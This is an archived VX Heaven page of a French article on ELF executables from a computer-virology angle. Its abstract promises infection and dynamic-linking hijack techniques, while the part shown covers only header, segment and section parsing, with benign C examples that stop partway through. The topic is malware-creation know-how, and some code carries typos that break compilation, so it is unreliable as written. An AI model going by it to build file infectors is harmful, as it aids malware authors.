@@ -1,0 +1,688 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title>Matthieu Kaczmarek 'ELF et virologie informatique' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="Matthieu Kaczmarek"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Kaczmarek, Matthieu,ELF et virologie informatique, printf, insertion, être, code, sections, segments, objets, droit, sizeof, chargé, fichiers, mécanismes, segment, liaison, unix"/>
+<meta name="Description" content="Cet article explore le format ELF du point de vue de la virologie informatique. Nous dÃ©crivons une technique classique permettant d'infecter un fichier ELF exÃ©cutable. La principale contribution de cet article sera de montrer comment exploiter les objets partagÃ©s en dÃ©tournant le mÃ©canisme de liaison dynamique. Cette Ã©tude se veut pratique et elle est illustrÃ©e par des programmes C."/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"85dede9bca59dd336563f27a2ef9cdff2a56ffbf-1498757820-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vmk00.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>ELF et virologie informatique</h1><p><a href="/lib/?lang=fr&amp;author=Kaczmarek%2C%20Matthieu">Matthieu Kaczmarek</a><br/> <em>GNU Linux Magasine France, HS 32 (2007) pp.12-19</em><br/> <em>ISSN 0183-0864</em><br/></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vmk00.html';</script><img src="/img/pdf.gif" alt="PDF"/><a href="/lib/pdf/ELF%20et%20virologie%20informatique.pdf">Download</a> PDF (256.94Kb) (You need to be registered on <a href="/forum">forum</a>)<br/>[<a style="" href="/lib/?lang=FR&amp;index=UN#vmk00">Back to index</a>] [<a href="/lib/vmk00.html#disqus_thread">Comments</a>]<br/> 
+<address>
+Matthieu Kaczmarek<br/>
+Ecole des mines de Nancy - INPL - Loria
+</address>
+<ul>
+<li><a href="#c1">Résumé</a></li>
+<li><a href="#c2">Structure d'un fichier ELF</a>
+<ul>
+<li><a href="#c21">Description générale</a></li>
+<li><a href="#c22">En pratique</a>
+<ul>
+<li><a href="#c221">L'en-tète</a></li>
+<li><a href="#c222">Les segments</a></li>
+<li><a href="#c223">Les sections</a></li>
+</ul></li>
+<li><a href="#c23">Chargement en mémoire</a></li>
+<li><a href="#c24">Insertion de code</a></li>
+<li><a href="#c25">Remarques</a></li>
+</ul></li>
+<li><a href="#c3">Liaison dynamique</a>
+<ul>
+<li><a href="#c31">Description générale</a></li>
+<li><a href="#c32">En pratique</a>
+<ul>
+<li><a href="#c321">Les noms de sections</a></li>
+<li><a href="#c322">Les symboles</a></li>
+<li><a href="#c323">Les emballages de fonction</a></li>
+</ul></li>
+<li><a href="#c33">Insertion et liaison</a></li>
+</ul></li>
+<li><a href="#c4">Conclusion</a></li>
+<li><a href="#c5">Bibliographie</a></li>
+</ul>
+<h2><a name="c1"></a>Résumé</h2>
+<p>Cet article explore le format ELF du point de vue de la virologie informatique. Nous décrivons une technique classique permettant d'infecter un fichier ELF exécutable. La principale contribution de cet article sera de montrer comment exploiter les objets partagés en détournant le mécanisme de liaison dynamique. Cette étude se veut pratique et elle est illustrée par des programmes C.</p>
+<p>La virologie informatique est une discipline vieille d'une vingtaine d'années. Jusquà maintenant les architectures de type Unix ont été épargnées par les logiciels malicieux. Mais le développement des attaques spécialisées d'une part, et l'augmentation du nombre d'utdisateurs d'autre part, amènent à penser que les systèmes Unix pourraient aussi être les cibles de futures attaques. Plusieurs articles [1, 5, 6] ont déjà présenté des techniques virales dédiées au format ELF (Executable and Linking Format) Ici, nous en reprendrons les grandes lignes et nous montrerons qu'il est possible d'exploiter le mécanisme de liaison dynamique pour rendre le code inséré plus fiirtif et plus fonctionnel.</p>
+<p>La connaissance des formats de fichiers exécutables est essentielle pour tout acteur de la virologie informatique. Cet exposé n'est pas destiné à encourager la construction de programmes malveillants. Au contraire, une telle étude permet de faciliter l'analyse de fichiers infectés et donc d'accélérer leur identification. La rapidité d'analyse étant cruciale pour toute réponse antivirale, ce type d'étude est indispensable.</p>
+<p>Cet article comporte aussi une dimension scientifique liée à l'étude théorique [4]. Cette dernière met en évidence une correspondance entre les techniques virales et les mécanismes de compilation Dans cet article nous montrons que l'insertion de code s'apparente aux mécanismes de liaison d'objet. Ce concept appuie l'étude précédente par une dimension expérimentale, et il contribue à la compréhension des problématiques de la virologie informatique. Pour une introduction à cette discipline, nous conseillons la lecture des livres [2,3].</p>
+<p>La description du format de fichier ELF se déroulera en deux temps. Premièrement, nous étudierons sa structure et nous montrerons comment elle peut être compromise afin d'y insérer un code étranger. Ensuite nous étudierons le mécanisme de liaison dynamique et nous exposerons comment il peut être détourné au profit d'une insertion.</p>
+<p>Nous utiliserons des programmes C pour illustrer notre propos. Le lecteur désireux d'obtenir les informations exposées sans programmer pourra utiliser la commande <em>readelf</em> accessible depuis la plupart des environnements Unix. Il existe aussi une bibliothèque C, <em>libelf</em> [8], facilitant certains accès à la structure ELF. Les types et les constantes auxquels nous ferons référence se trouvent dans le fichier <em>elf.h</em> de la <em>libc</em>. Nous réaliserons nos expériences sur une copie du programme <em>bash</em>.</p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #666666;">$ </span><span style="color: #c20cb9; font-weight: bold;">cp</span> <span style="color: #000000; font-weight: bold;">/</span>bin<span style="color: #000000; font-weight: bold;">/</span><span style="color: #c20cb9; font-weight: bold;">bash</span> ~<span style="color: #000000; font-weight: bold;">/</span></div>
+<h2><a name="c2"></a>Structure d'un fichier ELF</h2>
+<p>Nous présentons les grandes lignes de la structure d'un fichier ELF. Pour un exposé détaillé le lecteur pourra se référer a [7].</p>
+<h3><a name="c21"></a>Description générale</h3>
+<p>Le format ELF a été créé dans les laboratoires de Unix Systems, il est maintenant considéré comme un standard des environnements de type Unix. Sas structure permet non seulement de décrire le chargement d'un objet en mémoire mais aussi de faciliter le processus de liaison entre différents objets. Ainsi ce format peut être appliqué à trois types de fichier.</p>
+<ul>
+<li><em>Les fichiers exécutables</em>: ils contiennent du code prêt a être interprèté.</li>
+<li><em>Les fichiers d'objets réadressables</em>: ils contiennent du code ou des données pouvant être liés avec d'autres objets.</li>
+<li><em>Les fichiers d'objets partagés</em>: ce sont des objets réadressables pouvant être liés soit statiquement à un objet pour construire un nouvel objet, soit dynamiquement à un exécutable ou à un autre objet partagé afin de constituer une image mémoire.</li>
+</ul>
+<p>Un fichier ELF se décompose principalement en quatre parties: un en-tête, une table des segments, une table des sections et un corps comportant du code et des données.</p>
+<p>Le corps d'un fichier ELF peut être divisé de deux manières différentes: en segments et en sections. Ces divisions peuvent se chevaucher mais chaque seclion ne peut résider que sur un seul segment. En d'autres termes, un segment peut contenir une ou plusieurs sections mais la réciproque est fausse. Toutefois, la division en segments est optionnelle pour un fichier d'objet readressable, la table des segments est alors absente. De même, la division en sections est optionnelle pour un fichier exécutable ou pour certains objets partagés.</p>
+<h3><a name="c22"></a>En pratique</h3>
+<h4><a name="c221"></a>L'en-tète</h4>
+<p>L'en-tête se situe au debut du fichier, il permet de localiser les autres parties du format comme les tables de segments et de sections. Sa structure est décrite par le typw <em>ELF32_Ehdr</em>. Nous présentons quelques champs qui nous seront utiles par la suite.</p>
+<ul>
+<li><em>e_phoff, e_shoff</em>: positions respectives de la table des segments et de la table des sections dans le fichier.</li>
+<li><em>e_shstrndx</em>: index de la section contenant la table des noms de sections.</li>
+<li><em>e_entry</em>: adresse mémoire ou commence l'exécution (point d'entrée).</li>
+</ul>
+<p>Le programme suivant montre comment extraire les informations de l'en-tête.</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#include &lt;stdio.h&gt;</span><br/>
+<span style="color: #339933;">#include &lt;elf.h&gt;</span><br/>
+<br/>
+<span style="color: #993333;">int</span> main<span style="color: black;">&#40;</span><span style="color: #993333;">int</span> argc<span style="color: #339933;">,</span> <span style="color: #993333;">char</span><span style="color: #339933;">**</span> argv<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Ehdr hdr<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; FILE<span style="color: #339933;">*</span> fp <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fopen.html"><span style="color: #000066;">fopen</span></a><span style="color: black;">&#40;</span>argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;r&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>hdr<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_Ehdr<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Signature Entrée Tab seg Tab sec<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;%9.3s &quot;</span><span style="color: #339933;">,</span> hdr.<span style="color: #202020;">e_ident</span> <span style="color: #339933;">+</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;%8x &quot;</span><span style="color: #339933;">,</span> hdr.<span style="color: #202020;">e_entry</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;%8x &quot;</span><span style="color: #339933;">,</span> hdr.<span style="color: #202020;">e_phoff</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;%8x <span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span> hdr.<span style="color: #202020;">e_shhoff</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fclose.html"><span style="color: #000066;">fclose</span></a><span style="color: black;">&#40;</span>fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+&nbsp;</div>
+<p>Ce programme produit la sortie suivante.</p>
+<pre class="source">
+$ ./header bash
+Signature Entrée  Tab seg Tab sec
+ELF       805c210 34      a7b48
+</pre>
+<h4><a name="c222"></a>Les segments</h4>
+<p>Les segments représentent l'image mémoire produite par le chargement du fichier. Ils sont indexés par la table des segments, aussi appelé en-tête de programme. Les éléments de cette table sont décrits par le type ELF32_Phdr. On y retrouve les champs suivants.</p>
+<ul>
+<li><em>p_type</em>: type du segment.</li>
+<li><em>p_flags</em>: droits alloués au segment, exécution, écriture et lecture.</li>
+<li><em>p_offset, p_filesz</em>: position et taille du segment dans le fichier.</li>
+<li><em>p_vaddr, p_memsz</em>: adresse où le segment est chargé et espace mémoire occupé par ce dernier.</li>
+</ul>
+<p>Pour cet article nous nous intéresserons seulement au type <em>PT_LOAD</em>, qui correspond aux segments qui sont chargés en mémoire.</p>
+<p>La valeur du champ <em>p_flag</em> dépend de l'architecture d'exécution. Par exemple pour un processeur de type ia86, le premier bit correspond au droit d'exécution, le second au droit d'écriture et le troisième au droit de lecture.</p>
+<p>Le programme suivant présente comment parcouirir la table des segments.</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#include &lt;stdio.h&gt;</span><br/>
+<span style="color: #339933;">#include &lt;elf.h&gt;</span><br/>
+<br/>
+<span style="color: #993333;">int</span> main <span style="color: black;">&#40;</span><span style="color: #993333;">int</span> argc<span style="color: #339933;">,</span> <span style="color: #993333;">char</span><span style="color: #339933;">**</span> argv<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Ehdr hdr<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; FILE <span style="color: #339933;">*</span>fp <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fopen.html"><span style="color: #000066;">fopen</span></a><span style="color: black;">&#40;</span>argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;r&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>hdr<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_Ehdr<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>hdr.<span style="color: #202020;">e_phoff</span> <span style="color: #339933;">==</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fprintf.html"><span style="color: #000066;">fprintf</span></a><span style="color: black;">&#40;</span>stderr<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;Absence de table des segmentss<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Se positionner sur la table des segments */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a><span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> hdr.<span style="color: #202020;">e_phoff</span><span style="color: #339933;">,</span> SEEK_SET<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot; # LOAD Position Taille Adresse Espace xwr<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Parcourir les hdr.e_phnum segments */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Phdr seg<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_half i<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span> i <span style="color: #339933;">&lt;</span> hdr.<span style="color: #202020;">e_phnum</span><span style="color: #339933;">;</span> <span style="color: #339933;">++</span>i<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Récupérer le segment */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a> <span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>segm <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_Phdr<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;%2i &quot;</span><span style="color: #339933;">,</span> i<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;%4s &quot;</span><span style="color: #339933;">,</span> <span style="color: black;">&#40;</span>seg.<span style="color: #202020;">p_type</span> <span style="color: #339933;">==</span> PT_LOAD <span style="color: #339933;">?</span> <span style="color: #ff0000;">&quot;Oui&quot;</span> <span style="color: #339933;">:</span> <span style="color: #ff0000;">&quot;Non&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;%8x &quot;</span><span style="color: #339933;">,</span> seg.<span style="color: #202020;">p_offset</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;%8x &quot;</span><span style="color: #339933;">,</span> seg.<span style="color: #202020;">p_filesz</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;%8x &quot;</span><span style="color: #339933;">,</span> seg.<span style="color: #202020;">p_vaddr</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;%8x &quot;</span><span style="color: #339933;">,</span> seg.<span style="color: #202020;">p_memsz</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;%c%c%c <span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; seg.<span style="color: #202020;">p_flags</span> <span style="color: #339933;">%</span> <span style="color: #0000dd;">2</span> <span style="color: #339933;">?</span> <span style="color: #ff0000;">'x'</span> <span style="color: #339933;">:</span> <span style="color: #ff0000;">' '</span><span style="color: #339933;">,</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Exécution */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span>seg.<span style="color: #202020;">p_flags</span> <span style="color: #339933;">&gt;&gt;</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span> <span style="color: #339933;">%</span> <span style="color: #0000dd;">2</span> <span style="color: #339933;">?</span> <span style="color: #ff0000;">'w'</span> <span style="color: #339933;">:</span> <span style="color: #ff0000;">' '</span><span style="color: #339933;">,</span> &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Ecriture */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span>seg.<span style="color: #202020;">p_flags</span> <span style="color: #339933;">&gt;&gt;</span> <span style="color: #0000dd;">2</span><span style="color: black;">&#41;</span> <span style="color: #339933;">%</span> <span style="color: #0000dd;">2</span> <span style="color: #339933;">?</span> <span style="color: #ff0000;">'r'</span> <span style="color: #339933;">:</span> <span style="color: #ff0000;">' '</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Lecture */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fclose.html"><span style="color: #000066;">fclose</span></a><span style="color: black;">&#40;</span>fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+&nbsp;</div>
+<p>Ce programme produit la sortie suivante.</p>
+<pre class="source">
+# LOAD Position Taille Adresse Espace xwr
+0 Non  34       100    8048034 100    x r
+1 Non  134      13     8048134 13       r
+2 Oui  0        a23c0  8048000 a23c0  x r
+3 Oui  a23c0    4b84   80eb3c0 9898    wr
+4 Non  a23d4    d8     80eb3d4 d8      wr
+5 Non  148      20     8048148 20       r
+6 Non  a22f8    2c     80ea2f8 2c       r
+7 Non  0        0      0       0       wr
+</pre>
+<p>Le lecteur attentif remarquera qu'il y a un espace mémoire inoccupé entre la fin du segment 2 et le du segment 3.</p>
+<h4><a name="c223"></a>Les sections</h4>
+<p>Comme les segments, les sections sont indexées par une table d'en-têtes dont les éléments sont décrits par le type Elf32_Shdr. Voici quelques uns des champs qui le composent.</p>
+<ul>
+<li>sh_flags: qualifie les données contenues dans la sectton: inscriptibles, allouables ou exécutable. Nous verrons que ce champ est seulement indicatif et ne représente pas les droits effectivement associés aux données de la section.</li>
+<li>sh_offsett, sh_size: position et taille de la section dans le fichier.</li>
+</ul>
+<p>Le découpage en sections est particulièrement important pour les processus de liaison, cet aspect sera traité plus bas.</p>
+<p>L'accès aux en-têtes de section s'effectue de manière analogue à l'accès aux en-têtes de segments.</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#include &lt;stdio.h&gt;</span><br/>
+<span style="color: #339933;">#include &lt;elf.h&gt;</span><br/>
+<br/>
+<span style="color: #993333;">int</span> main<span style="color: black;">&#40;</span><span style="color: #993333;">int</span> argc<span style="color: #339933;">,</span> <span style="color: #993333;">char</span><span style="color: #339933;">**</span> argv<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Ehdr hdr<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; FILE<span style="color: #339933;">*</span> fp <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fopen.html"><span style="color: #000066;">fopen</span></a><span style="color: black;">&#40;</span>argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;r&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
